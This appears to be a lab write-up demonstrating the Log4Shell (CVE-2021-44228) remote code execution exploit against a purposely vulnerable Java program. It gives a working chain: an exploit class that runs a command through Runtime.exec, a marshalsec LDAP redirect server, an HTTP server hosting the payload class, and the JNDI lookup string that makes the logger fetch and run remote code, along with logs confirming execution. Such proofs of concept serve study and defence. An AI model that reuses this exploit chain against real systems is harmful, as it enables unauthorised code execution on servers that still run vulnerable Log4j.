Thanks for : 

https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce

https://github.com/mbechler/marshalsec

Okay flow is simple:

When we sent a input to any application, they logs some request for later analysis. apache log4j library used for logging these inputs. We will send a payload and execute codes from apache log4j library during logging

I tested on "apache-log4j-2.13.0"

first i will create a java vulnerable application. Basicly it gets an input and use that input inside of "logger.error" function

	package log4j;
	import java.util.*;  

	import org.apache.logging.log4j.LogManager;
	import org.apache.logging.log4j.Logger;

	public class main {

		private static final Logger logger = LogManager.getLogger(main.class);
		public static void main(String[] args) {
			Scanner sc= new Scanner(System.in); //System.in is a standard input stream  
			System.out.print("Enter a string: ");  
			String str= sc.nextLine();              //reads string  
			System.out.print("You have entered: "+str);
			logger.error(str);
		}

	}
	
i will craft a special "exploit.java" file for code execution, for test we will make payload to ping somewhere

	└─$ cat exploit.java
	public class exploit {
			static {
					try {
							Runtime.getRuntime().exec("cmd.exe /c ping 192.168.200.101");
					} catch (Exception e) {
							e.printStackTrace();
					}
			}
	}         


Start tcp dump and filter for icmp package

	└─$ sudo tcpdump -i eth0 icmp                                                                                                                  
	[sudo] password for kali: 
	tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
	listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes

convert "exploit.java" file to "exploit.class" file

	javac exploit.java
	
Now start a simple http server inside of directory

	└─$ sudo python -m SimpleHTTPServer 80                                                                                              
	[sudo] password for kali: 
	Serving HTTP on 0.0.0.0 port 80 ...


We will start a LDAP server, first java application will reach ldap server and this ldap server will redirect request to HTTP server (192.168.200.101)

	└─$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.200.101/#exploit
	Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
	Listening on 0.0.0.0:1389
	
We will start vulnerable application and sent a payload like: (ip adress is ldap server ip)

	${jndi:ldap://192.168.200.101:1389/exploit}
	
run test application and give input (we will get and error message but ignore it)

	Enter a string: ${jndi:ldap://192.168.200.101:1389/exploit}
	You have entered: ${jndi:ldap://192.168.200.101:1389/exploit}
	23:40:46.982 [main] ERROR log4j.main - ${jndi:ldap://192.168.200.101:1389/exploit}

first check ldap server, it redirects to our HTTP server

	└─$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.200.101/#exploit
	Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
	Listening on 0.0.0.0:1389
	Send LDAP reference result for exploit redirecting to http://192.168.200.101/exploit.class


On HTTP server you can see GET request for payload

	└─$ sudo python -m SimpleHTTPServer 80                                                                                              
	[sudo] password for kali: 
	Serving HTTP on 0.0.0.0 port 80 ...
	192.168.200.1 - - [12/Dec/2021 15:40:47] "GET /exploit.class HTTP/1.1" 200 -

Check tcpdump and see if there is any ping request

	└─$ sudo tcpdump -i eth0 icmp                                                                                                                
	[sudo] password for kali: 
	tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
	listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
	15:43:24.801831 IP 192.168.200.1 > 192.168.200.101: ICMP echo request, id 1, seq 256, length 40
	15:43:24.801917 IP 192.168.200.101 > 192.168.200.1: ICMP echo reply, id 1, seq 256, length 40
	15:43:25.811859 IP 192.168.200.1 > 192.168.200.101: ICMP echo request, id 1, seq 257, length 40
	15:43:25.811904 IP 192.168.200.101 > 192.168.200.1: ICMP echo reply, id 1, seq 257, length 40
	15:43:26.824831 IP 192.168.200.1 > 192.168.200.101: ICMP echo request, id 1, seq 258, length 40
	15:43:26.824874 IP 192.168.200.101 > 192.168.200.1: ICMP echo reply, id 1, seq 258, length 40
	15:43:27.836873 IP 192.168.200.1 > 192.168.200.101: ICMP echo request, id 1, seq 259, length 40
	15:43:27.836920 IP 192.168.200.101 > 192.168.200.1: ICMP echo reply, id 1, seq 259, length 40
